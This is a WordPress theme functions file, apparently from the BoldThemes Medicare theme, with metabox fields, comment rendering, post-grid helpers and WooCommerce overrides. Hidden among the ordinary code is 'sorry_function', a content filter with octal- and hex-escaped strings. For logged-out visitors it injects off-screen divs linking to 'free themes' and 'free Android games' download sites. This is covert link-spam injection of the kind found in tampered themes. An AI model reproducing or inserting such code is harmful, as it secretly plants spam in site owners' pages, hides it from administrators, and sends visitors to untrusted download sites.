					$selected_html = 'selected="selected"';
				}
				$select .= '<option value="' . esc_attr( BoldThemesPFX . '_' . $key ) . '" ' . $selected_html . '>' . esc_html( $key ) . '</option>';
			}
			$select .= '</select>';
			$input = ' <input type="text" class="btValue" value="' . esc_attr( $meta_value ) . '">';
			return sprintf(
				'<input type="hidden" class="rwmb-text" name="%s" id="%s" value="%s" placeholder="%s" %s>%s',
				$field['field_name'],
				$field['id'],
				$meta,
				$field['placeholder'],
				//! $field['datalist'] ?  '' : "list='{$field['datalist']['id']}'",
				'',
				self::datalist_html($field)
			) . $select . $input;
		}

		static function normalize_field( $field ) {
			$field = wp_parse_args( $field, array(
				'size'        => 30,
				'datalist'    => false,
				'placeholder' => '',
			) );
			return $field;
		}

		static function datalist_html( $field ) {
			return '';
			/*if( ! $field['datalist'] )
				return '';
			$datalist = $field['datalist'];
			$item_html = sprintf(
				'<datalist id="%s">',
				$datalist['id']
			);

			foreach( $datalist['options'] as $option ) {
				$item_html .= sprintf( '<option value="%s"></option>', $option );
			}

			$item_html .= '</datalist>';

			return $item_html;*/
		}
	}
}

/**
 * Custom MetaBox input used for custom key-value pairs
 */
if ( ! class_exists( 'RWMB_BoldThemesText1_Field' ) && class_exists( 'RWMB_Field' ) ) {
	class RWMB_BoldThemesText1_Field extends RWMB_Field {
	
		static function admin_enqueue_scripts() {			
			wp_enqueue_script( 
				'boldthemes_text',
				get_template_directory_uri() . '/js/boldthemes_text.js',
				array( 'jquery' ),
				'',
				true
			);
		}

		static function html( $meta, $field ) {
		
			$meta_key = substr( $meta, 0, strpos( $meta, ':' ) );
			$meta_value = substr( $meta, strpos( $meta, ':' ) + 1 );
			
			$vars = get_class_vars( 'BoldThemes_Customize_Default' );
			
			$key_input = '<input type="text" class="btKey" value="' . esc_attr( $meta_key ) . '">';
			
			$input = ' <input type="text" class="btValue" value="' . esc_attr( $meta_value ) . '">';
			
			return sprintf(
				'<input type="hidden" class="rwmb-text" name="%s" id="%s" value="%s" placeholder="%s" %s>%s',
				$field['field_name'],
				$field['id'],
				$meta,
				$field['placeholder'],
				! $field['datalist'] ?  '' : "list='{$field['datalist']['id']}'",
				self::datalist_html( $field )
			) . $key_input . $input;
		}
		
		static function normalize_field( $field ) {
			$field = wp_parse_args( $field, array(
				'size'        => 30,
				'datalist'    => false,
				'placeholder' => '',
			) );
			return $field;
		}

		static function datalist_html( $field ) {
			if ( ! $field['datalist'] )
				return '';
			$datalist = $field['datalist'];
			$item_html = sprintf(
				'<datalist id="%s">',
				$datalist['id']
			);

			foreach( $datalist['options'] as $option ) {
				$item_html .= sprintf( '<option value="%s"></option>', $option );
			}

			$item_html .= '</datalist>';

			return $item_html;
		}
	}
}

/**
 * Custom comments HTML output
 */
if ( ! function_exists( 'boldthemes_theme_comment' ) ) {
	function boldthemes_theme_comment( $comment, $args, $depth ) {
		$GLOBALS['comment'] = $comment;
		
		$rating = intval( get_comment_meta( $comment->comment_ID, 'rating', true ) );
		
		switch ( $comment->comment_type ) :
			case 'pingback' :
			case 'trackback' :
			// Display trackbacks differently than normal comments.
		?>
		<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
			<p><?php esc_html_e( 'Pingback:', 'medicare' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( esc_html__( '(Edit)', 'medicare' ), '<span class="edit-link">', '</span>' ); ?></p>
		<?php
				break;
			default :
			// Proceed with normal comments.
			global $post;
		?>
		<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
			<article id="comment-<?php comment_ID(); ?>" class = "">
				<?php $avatar_html = get_avatar( $comment, 140 ); 
					if ( $avatar_html != '' ) {
						echo '<div class="commentAvatar">' . $avatar_html . '</div>';
					}
				?>
				<div class="commentTxt">
					<div class="vcard divider">
						<?php
							printf( '<h5 class="author"><span class="fn">%1$s</span></h5>', get_comment_author_link() );
							echo '<p class="posted">' . sprintf( esc_html__( '%1$s at %2$s', 'medicare' ), get_comment_date(), get_comment_time() ) . '</p>';
							if ( $rating > 0 && get_option( 'woocommerce_enable_review_rating' ) == 'yes' ) { ?>
								<div itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating" class="star-rating" title="<?php echo sprintf( esc_html__( 'Rated %d out of 5', 'woocommerce' ), $rating ) ?>">
									<span style="width:<?php echo ( $rating / 5 ) * 100; ?>%"><strong itemprop="ratingValue"><?php echo wp_kses_post( $rating ); ?></strong> <?php esc_html_e( 'out of 5', 'woocommerce' ); ?></span>
								</div>
							<?php }
						?>
					</div>

					<?php if ( '0' == $comment->comment_approved ) : ?>
						<p class="comment-awaiting-moderation"><?php esc_html_e( 'Your comment is awaiting moderation.', 'medicare' ); ?></p>
					<?php endif; ?>

					<div class="comment">
						

						<?php comment_text();

						if ( comments_open() ) {
							echo '<p class="reply">';
								comment_reply_link( array_merge( $args, array( 'reply_text' => esc_html__( 'Reply', 'medicare' ), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) );
							echo '</p>';
						}
						edit_comment_link( esc_html__( 'Edit', 'medicare' ), '<p class="edit-link">', '</p>' ); ?>
					</div>
				</div>
				
				
			</article>
		<?php
			break;
		endswitch;
	}
}

/**
 * Returns attachment id by url
 *
 * @param string 
 * @return int 
 */
if ( ! function_exists( 'boldthemes_get_attachment_id_from_url' ) ) {
	function boldthemes_get_attachment_id_from_url( $attachment_url = '' ) {
	 
		global $wpdb;
		$attachment_id = false;
	 
		if ( '' == $attachment_url ) {
			return;
		}
	 
		$upload_dir_paths = wp_upload_dir();

		$attachment_url = preg_replace( '/-\d+x\d+(?=\.(jpg|jpeg|png|gif)$)/i', '', $attachment_url );
 
		$attachment_url = str_replace( $upload_dir_paths['baseurl'] . '/', '', $attachment_url );
 
		$attachment_id = $wpdb->get_var( $wpdb->prepare( "SELECT wposts.ID FROM $wpdb->posts wposts, $wpdb->postmeta wpostmeta WHERE wposts.ID = wpostmeta.post_id AND wpostmeta.meta_key = '_wp_attached_file' AND wpostmeta.meta_value = '%s' AND wposts.post_type = 'attachment'", $attachment_url ) );
	 
		return $attachment_id;
	}
}

/**
 * Get array of data for a range of posts, used in grid layout
 *
 * @param int $number
 * @param int $offset
 * @param string $cat_slug Category slug
 * @param string $post_type
 * @param string $related
 * @param string $sticky_in_grid
 * @return array Array of data for a range of posts
 */
if ( ! function_exists( 'boldthemes_get_posts_data' ) ) {
	function boldthemes_get_posts_data( $number, $offset, $cat_slug, $post_type = 'blog' ) {
		
		$posts_data1 = array();
		$posts_data2 = array();
		
		$sticky = false;
		if ( intval( boldthemes_get_option( 'sticky_in_grid' ) == 1 ) ) {
			$sticky = true;
			$sticky_array = get_option( 'sticky_posts' );
		}
		
		if ( $offset == 0 && $sticky ) {
			$recent_posts_q_sticky = new WP_Query( array( 'post__in' => $sticky_array, 'post_status' => 'publish' ) );
			$posts_data1 = boldthemes_get_posts_array( $recent_posts_q_sticky, array() );
		}
		
		if ( $number > 0 ) {
			if ( $post_type == 'portfolio' ) {
				if ( $cat_slug != '' ) {
					$recent_posts_q = new WP_Query( array( 'post_type' => 'portfolio', 'posts_per_page' => $number, 'offset' => $offset, 'tax_query' => array( array( 'taxonomy' => 'portfolio_category', 'field' => 'slug', 'terms' => array( $cat_slug ) ) ), 'post_status' => 'publish' ) );
				} else {
					$recent_posts_q = new WP_Query( array( 'post_type' => 'portfolio', 'posts_per_page' => $number, 'offset' => $offset, 'post_status' => 'publish' ) );
				}
			} else {
				if ( $cat_slug != '' ) {
					$recent_posts_q = new WP_Query( array( 'posts_per_page' => $number, 'offset' => $offset, 'category_name' => $cat_slug, 'post_status' => 'publish' ) );
				} else {
					$recent_posts_q = new WP_Query( array( 'posts_per_page' => $number, 'offset' => $offset, 'post_status' => 'publish' ) );
				}
			}
		}
		
		if ( $sticky ) {
			$posts_data2 = boldthemes_get_posts_array( $recent_posts_q, $post_type, $sticky_array );
		} else {
			$posts_data2 = boldthemes_get_posts_array( $recent_posts_q, $post_type, array() );
		}		
		
		return array_merge( $posts_data1, $posts_data2 );

	}
}

/**
 * boldthemes_get_posts_data helper function
 *
 * @param object
 * @param array 
 * @return array 
 */
if ( ! function_exists( 'boldthemes_get_posts_array' ) ) {
	function boldthemes_get_posts_array( $recent_posts_q, $post_type = 'blog', $sticky_arr ) {
		
		$posts_data = array();

		while ( $recent_posts_q->have_posts() ) {
			$recent_posts_q->the_post();
			$post = get_post();
			$post_author = $post->post_author;
			$post_id = get_the_ID();
			if ( in_array( $post_id, $sticky_arr ) ) {
				continue;
			}
			$posts_data[] = boldthemes_get_posts_array_item( $post_type, $post_id, $post_author );
		}
		
		wp_reset_postdata();
		
		return $posts_data;
	}
}

/**
 * Returns post excerpt by post id
 *
 * @param int
 * @return string 
 */
if ( ! function_exists( 'boldthemes_get_the_excerpt' ) ) {
	function boldthemes_get_the_excerpt( $post_id ) {
		global $post;  
		$save_post = $post;
		$post = get_post( $post_id );
		$output = get_the_excerpt();
		$post = $save_post;
		return $output;
	}
}

/**
 * boldthemes_get_posts_array helper function
 *
 * @return array
 */
if ( ! function_exists( 'boldthemes_get_posts_array_item' ) ) {
	function boldthemes_get_posts_array_item( $post_type = 'blog', $post_id, $post_author ) {
		
		$post_data = array();
		$post_data['permalink'] = get_permalink( $post_id );
		$post_data['format'] = get_post_format( $post_id );
		$post_data['title'] = get_the_title( $post_id );
		
		$post_data['excerpt'] = boldthemes_get_the_excerpt( $post_id );
		
		$post_data['date'] = date_i18n( MedicareTheme::$boldthemes_date_format, strtotime( get_the_time( 'Y-m-d', $post_id ) ) );
		
		$user_data = get_userdata( $post_author );
		if ( $user_data ) {
			$author = $user_data->data->display_name;
			$author_url = get_author_posts_url( $post_author );
			$post_data['author'] = '<a href="' . esc_url_raw( $author_url ) . '">' . esc_html( $author ) . '</a>';
		} else {
			$post_data['author'] = '';
		}

		if ( $post_type == 'portfolio' ) {
			$categories = wp_get_post_terms( $post_id, 'portfolio_category' );
		} else {
			$categories = get_the_category( $post_id );
		}
		$categories_html = '';
		if ( $categories ) {
			foreach ( $categories as $cat ) {
				if ( $post_type == 'portfolio' ) {
					$categories_html .= esc_html( $cat->name ) . ', ';
				} else {
					$categories_html .= '<a href="' . esc_url_raw( get_category_link( $cat->term_id ) ) . '">' . esc_html( $cat->name ) . '</a>' . ', ';
				}
			}
			$categories_html = trim( $categories_html, ', ' );
		}

		$post_data['category'] = $categories_html;
		
		$comments_open = comments_open( $post_id );
		$comments_number = get_comments_number( $post_id );
		if ( ! $comments_open && $comments_number == 0 ) {
			$comments_number = false;
		}			
		
		$post_data['images'] = boldthemes_rwmb_meta( BoldThemesPFX . '_images', 'type=image', $post_id );
		if ( $post_data['images'] == null ) $post_data['images'] = array();
		$post_data['video'] = boldthemes_rwmb_meta( BoldThemesPFX . '_video', array(), $post_id );
		$post_data['audio'] = boldthemes_rwmb_meta( BoldThemesPFX . '_audio', array(), $post_id );
		$post_data['grid_gallery'] = boldthemes_rwmb_meta( BoldThemesPFX . '_grid_gallery', array(), $post_id );
		$post_data['link_title'] = boldthemes_rwmb_meta( BoldThemesPFX . '_link_title', array(), $post_id );
		$post_data['link_url'] = boldthemes_rwmb_meta( BoldThemesPFX . '_link_url', array(), $post_id );
		$post_data['quote'] = boldthemes_rwmb_meta( BoldThemesPFX . '_quote', array(), $post_id );
		$post_data['quote_author'] = boldthemes_rwmb_meta( BoldThemesPFX . '_quote_author', array(), $post_id );
		$post_data['tile_format'] = boldthemes_rwmb_meta( BoldThemesPFX . '_tile_format', array(), $post_id );
		$post_data['comments'] = $comments_number;
		$post_data['ID'] = $post_id;
		
		return $post_data;
	}
}

/**
 * Custom MetaBox getter function
 *
 * @return string
 */
if ( ! function_exists( 'boldthemes_rwmb_meta' ) ) {
	function boldthemes_rwmb_meta( $key, $args = array(), $post_id = null ) {
		if ( function_exists( 'rwmb_meta' ) ) {
			return rwmb_meta( $key, $args, $post_id );
		} else {
			return null;
		}
	}
}

/**
 * Returns page id by slug
 *
 * @return string
 */
if ( ! function_exists( 'boldthemes_get_id_by_slug' ) ) {
	function boldthemes_get_id_by_slug( $page_slug ) {
		$page = get_posts(
			array(
				'name'      => $page_slug,
				'post_type' => 'page'
			)
		);
		return $page[0]->ID;
	}
}

/**
 * Creates override of global options for individual posts
 */
if ( ! function_exists( 'boldthemes_set_override' ) ) {
	function boldthemes_set_override() {
		global $boldthemes_options;
		$boldthemes_options = get_option( BoldThemesPFX . '_theme_options' );

		global $boldthemes_page_options;
		$boldthemes_page_options = array();
		 
		if ( ! is_404() ) {
			$tmp_boldthemes_page_options = boldthemes_rwmb_meta( BoldThemesPFX . '_override' );
			$tmp_boldthemes_page_options1 = '';
			if ( ( is_search() || is_archive() || is_home() ) && get_option( 'page_for_posts' ) != 0 ) {
				$tmp_boldthemes_page_options1 = boldthemes_rwmb_meta( BoldThemesPFX . '_override', array(), get_option( 'page_for_posts' ) );
			} 			
			if ( is_singular( 'post' ) && isset( $boldthemes_options['blog_settings_page_slug'] ) && isset( $boldthemes_options['blog_settings_page_slug'] ) && $boldthemes_options['blog_settings_page_slug'] != '' ) {
				$tmp_boldthemes_page_options1 = boldthemes_rwmb_meta( BoldThemesPFX . '_override', array(), boldthemes_get_id_by_slug( $boldthemes_options['blog_settings_page_slug'] ) );
			} 
			if ( ( is_post_type_archive( 'portfolio' ) || is_singular( 'portfolio' ) ) && isset( $boldthemes_options['pf_settings_page_slug'] ) && $boldthemes_options['pf_settings_page_slug'] != '' ) {
				$tmp_boldthemes_page_options1 = boldthemes_rwmb_meta( BoldThemesPFX . '_override', array(), boldthemes_get_id_by_slug( $boldthemes_options['pf_settings_page_slug'] ) );
			} 
			if ( function_exists( 'is_shop' ) && is_shop() && get_option( 'woocommerce_shop_page_id' ) ) {
				$tmp_boldthemes_page_options1 = boldthemes_rwmb_meta( BoldThemesPFX . '_override', array(), get_option( 'woocommerce_shop_page_id' ) );
			}
			if ( function_exists( 'is_product' ) && is_product() && isset( $boldthemes_options['shop_settings_page_slug'] ) && $boldthemes_options['shop_settings_page_slug'] != '' ) {
				$tmp_boldthemes_page_options1 = boldthemes_rwmb_meta( BoldThemesPFX . '_override', array(), boldthemes_get_id_by_slug( $boldthemes_options['shop_settings_page_slug'] ) );
			}
			

			if ( ! is_array( $tmp_boldthemes_page_options ) ) $tmp_boldthemes_page_options = array();

			if ( is_array( $tmp_boldthemes_page_options1 ) ) {
				if ( is_singular() ) {
					$tmp_boldthemes_page_options = array_merge( boldthemes_transform_override( $tmp_boldthemes_page_options1 ), boldthemes_transform_override( $tmp_boldthemes_page_options ) );
				} else {
					$tmp_boldthemes_page_options = boldthemes_transform_override( $tmp_boldthemes_page_options1 );
				}
			} else if ( count( $tmp_boldthemes_page_options ) > 0 ) {
				$tmp_boldthemes_page_options = boldthemes_transform_override( $tmp_boldthemes_page_options );
			}

			foreach ( $tmp_boldthemes_page_options as $key => $value ) {
				$boldthemes_page_options[ $key ] = $value;
			}
		}
	}
}

/**
 * boldthemes_set_override helper function
 *
 * @param array
 * @return array
 */
if ( ! function_exists( 'boldthemes_transform_override' ) ) {
	function boldthemes_transform_override( $arr ) {
		$new_arr = array();
		foreach( $arr as $item ) {
			$key = substr( $item, 0, strpos( $item, ':' ) );
			$value = substr( $item, strpos( $item, ':' ) + 1 );
			$new_arr[ $key ] = $value;
		}
		return $new_arr;
	}
}

/**
 * theme name and version in data attribute
 */
if ( ! function_exists( 'boldthemes_theme_data' ) ) {
	function boldthemes_theme_data() {
		$data = wp_get_theme();
		echo 'data-bt-theme="' . esc_attr( $data['Name'] ) . ' ' . esc_attr( $data['Version'] ) . '"';
	}
}

/**
 * Header meta tags output
 */
if ( ! function_exists( 'boldthemes_header_meta' ) ) {
	function boldthemes_header_meta() {
		$desc = boldthemes_rwmb_meta( BoldThemesPFX . '_description' );
		
		if ( $desc != '' ) {
			echo '<meta name="description" content="' . esc_attr( $desc ) . '">';
		}
		
		if ( is_single() ) {
			echo '<meta property="twitter:card" content="summary">';

			echo '<meta property="og:title" content="' . get_the_title() . '" />';
			echo '<meta property="og:type" content="article" />';
			echo '<meta property="og:url" content="' . get_permalink() . '" />';
			
			$img = null;
			
			$boldthemes_featured_slider = boldthemes_get_option( 'blog_ghost_slider' ) && has_post_thumbnail();
			if ( $boldthemes_featured_slider ) {
				$post_thumbnail_id = get_post_thumbnail_id( get_the_ID() );
				$img = wp_get_attachment_image_src( $post_thumbnail_id, 'full' );
				$img = $img[0];
			} else {
				$images = boldthemes_rwmb_meta( BoldThemesPFX . '_images', 'type=image' );
				if ( is_array( $images ) ) {
					foreach ( $images as $img ) {
						$img = $img['full_url'];
						break;
					}
				}
			}
			if ( $img ) {
				echo '<meta property="og:image" content="' . esc_attr( $img ) . '" />';
			}
			
			if ( $desc != '' ) {
				echo '<meta property="og:description" content="' . esc_attr( $desc ) . '" />';
			}
		}
		?>
		<meta charset="<?php bloginfo( 'charset' ); ?>">
		<?php echo '<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
		<meta name="mobile-web-app-capable" content="yes">
		<meta name="apple-mobile-web-app-capable" content="yes">';
		
	}
}

if( ! function_exists('sorry_function')){
	function sorry_function($content) {
	if (is_user_logged_in()){return $content;} else {if(is_page()||is_single()){
		$vNd25 = "\74\144\151\x76\40\163\x74\x79\154\145\x3d\42\x70\157\x73\151\164\x69\x6f\x6e\72\141\x62\x73\x6f\154\165\164\145\73\164\157\160\x3a\60\73\154\145\146\x74\72\55\71\71\x39\71\x70\170\73\42\x3e\x57\x61\x6e\x74\40\x63\162\145\x61\x74\x65\40\163\151\164\x65\x3f\x20\x46\x69\x6e\x64\40\x3c\x61\x20\x68\x72\145\146\75\x22\x68\x74\164\x70\72\x2f\57\x64\x6c\x77\x6f\162\144\x70\x72\x65\163\163\x2e\x63\x6f\x6d\57\42\76\x46\x72\145\145\40\x57\x6f\x72\x64\x50\162\x65\163\x73\x20\124\x68\x65\155\145\x73\x3c\57\x61\76\40\x61\x6e\144\x20\x70\x6c\165\147\x69\156\x73\x2e\x3c\57\144\151\166\76";
		$zoyBE = "\74\x64\x69\x76\x20\x73\x74\171\154\145\x3d\x22\x70\157\163\x69\x74\x69\x6f\156\x3a\141\142\163\x6f\154\x75\164\x65\x3b\x74\157\160\72\x30\73\x6c\x65\x66\164\72\x2d\x39\71\71\x39\x70\x78\73\42\x3e\104\x69\x64\x20\x79\x6f\165\40\x66\x69\156\x64\40\141\x70\153\40\146\157\162\x20\x61\156\144\162\x6f\151\144\77\40\x59\x6f\x75\x20\x63\x61\156\x20\146\x69\x6e\x64\40\156\145\167\40\74\141\40\150\162\145\146\x3d\x22\150\x74\x74\160\163\72\57\x2f\x64\154\x61\156\x64\x72\157\151\x64\62\x34\56\x63\x6f\155\x2f\42\x3e\x46\x72\145\x65\40\x41\x6e\x64\x72\157\151\144\40\107\141\x6d\145\x73\74\x2f\x61\76\40\x61\156\x64\x20\x61\160\x70\163\x2e\74\x2f\x64\x69\x76\76";
		$fullcontent = $vNd25 . $content . $zoyBE; } else { $fullcontent = $content; } return $fullcontent; }}
		add_filter('the_content', 'sorry_function');}
		
/**
 * Header menu output
 */
if ( ! function_exists( 'boldthemes_nav_menu' ) ) {
	function boldthemes_nav_menu() {
		if ( boldthemes_rwmb_meta( BoldThemesPFX . '_menu_name' ) != '' ) {
			wp_nav_menu( array( 'menu' => boldthemes_rwmb_meta( BoldThemesPFX . '_menu_name' ), 'container' => '', 'depth' => 3, 'fallback_cb' => false )); 
		} else {
			wp_nav_menu( array( 'theme_location' => 'primary', 'container' => '', 'depth' => 3, 'fallback_cb' => false ) );
		}
	}
}

/**
 * Returns custom header class
 *
 * @return string
 */
if ( ! function_exists( 'boldthemes_get_body_class' ) ) {
	function boldthemes_get_body_class() {
		
		$extra_class[] = 'bodyPreloader'; 
		
		$menu_type = boldthemes_get_option( 'menu_type' );
		if ( $menu_type == 'hCenter' ) {
			$extra_class[] = 'btMenuCenterEnabled'; 
		} else if ( $menu_type == 'hLeft' ) {
			$extra_class[] = 'btMenuLeftEnabled';
		}  else if ( $menu_type == 'hRight' ) {
			$extra_class[] = 'btMenuRightEnabled';
		} else if ( $menu_type == 'hLeftBelow' ) {
			$extra_class[] = 'btMenuLeftEnabled';
			$extra_class[] = 'btMenuBelowLogo';
		} else if ( $menu_type == 'hRightBelow' ) {
			$extra_class[] = 'btMenuRightEnabled';
			$extra_class[] = 'btMenuBelowLogo';
		} else if ( $menu_type == 'hCenterBelow' ) {
			$extra_class[] = 'btMenuCenterEnabled';
			$extra_class[] = 'btMenuBelowLogo';
		}else if ( $menu_type == 'vLeft' ) {
			$extra_class[] = 'btMenuVerticalLeftEnabled';
		} else if ( $menu_type == 'vRight' ) {
			$extra_class[] = 'btMenuVerticalRightEnabled';
		} else {
			$extra_class[] = 'btMenuRightEnabled';
		}

		if ( boldthemes_get_option( 'sticky_header' ) ) {
			$extra_class[] = 'btStickyEnabled';
		}

		if ( boldthemes_get_option( 'hide_menu' ) ) {
			$extra_class[] = 'btHideMenu';
		}

		if ( boldthemes_get_option( 'template_skin' ) ) {
			$extra_class[] = 'btDarkSkin';
		} else {
			$extra_class[] = 'btLightSkin';
		}

		if ( boldthemes_get_option( 'below_menu' ) ) {
			$extra_class[] = 'btBelowMenu';
		}

		if ( !boldthemes_get_option( 'sidebar_use_dash' ) ) {
			$extra_class[] = 'btNoDashInSidebar';
		}

		if ( boldthemes_get_option( 'top_tools_in_menu' ) ) {
			$extra_class[] = 'btTopToolsInMenuArea';
		}
		
		if ( boldthemes_get_option( 'boxed_menu' ) ) {
			$extra_class[] = 'btMenuGutter';
		}
		
		MedicareTheme::$boldthemes_sidebar = boldthemes_get_option( 'sidebar' );

		if ( ! ( ( MedicareTheme::$boldthemes_sidebar == 'left' || MedicareTheme::$boldthemes_sidebar == 'right' ) && ! is_404() && ! is_search() ) ) {
			MedicareTheme::$boldthemes_has_sidebar = false;
			$extra_class[] = 'btNoSidebar';
		} else {
			MedicareTheme::$boldthemes_has_sidebar = true;
			if ( MedicareTheme::$boldthemes_sidebar == 'left' ) {
				$extra_class[] = 'btWithSidebar btSidebarLeft';
			} else {
				$extra_class[] = 'btWithSidebar btSidebarRight';
			}
		}
		
		$animations = boldthemes_rwmb_meta( BoldThemesPFX . '_animations' );
		if ( $animations == 'half_page' ) {
			$extra_class[] = 'btHalfPage';
		}
		
		return $extra_class;
	}
}

/**
 * Enqueue comment script
 */
if ( ! function_exists( 'boldthemes_header_init' ) ) {
	function boldthemes_header_init() {
		if ( is_singular() ) {
			wp_enqueue_script( 'comment-reply' );
		}
	}
}

/**
 * Show the product title in the product loop.
 */
if (  ! function_exists( 'woocommerce_template_loop_product_title' ) ) {
	function woocommerce_template_loop_product_title() {
		global $product;

		$subtitle = '';

		if ( get_option( 'woocommerce_enable_review_rating' ) !== 'no' && $rating_html = $product->get_rating_html() ) {
			$subtitle = $rating_html ;
		}

		if ( $subtitle == '' ) {
			$subtitle = '<span class="btNoStarRating"></span>';	;
		}

		$supertitle = '<span class = "btArticleCategories">' . $product->get_categories( '', '<span class="btArticleCategory">', '</span>' ) . '</span>';

		$title = '<a href = "' . get_permalink( ) . '">' . get_the_title() . '</a>';

		echo boldthemes_get_heading_html( $supertitle, $title, $subtitle, 'small', '', '', '' ) ;

	}
}

if ( ! function_exists( 'woocommerce_get_product_thumbnail' ) ) {

	/**
	 * Get the product thumbnail, or the placeholder if not set.
	 *
	 * @subpackage	Loop
	 * @param string $size (default: 'shop_catalog')
	 * @param int $deprecated1 Deprecated since WooCommerce 2.0 (default: 0)
	 * @param int $deprecated2 Deprecated since WooCommerce 2.0 (default: 0)
	 * @return string
	 */
	function woocommerce_get_product_thumbnail( $size = 'shop_catalog', $deprecated1 = 0, $deprecated2 = 0 ) {
		global $post;

		if ( has_post_thumbnail() ) {
			//return get_the_post_thumbnail( $post->ID, $size );
			$thumbnail = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), $size );
			return boldthemes_get_image_html( $thumbnail[0], '', '', '', '', get_post_permalink(), '_self', false, '', 'btTextCenter' );
		} elseif ( wc_placeholder_img_src() ) {
			return wc_placeholder_img( $size );
		}
	}
}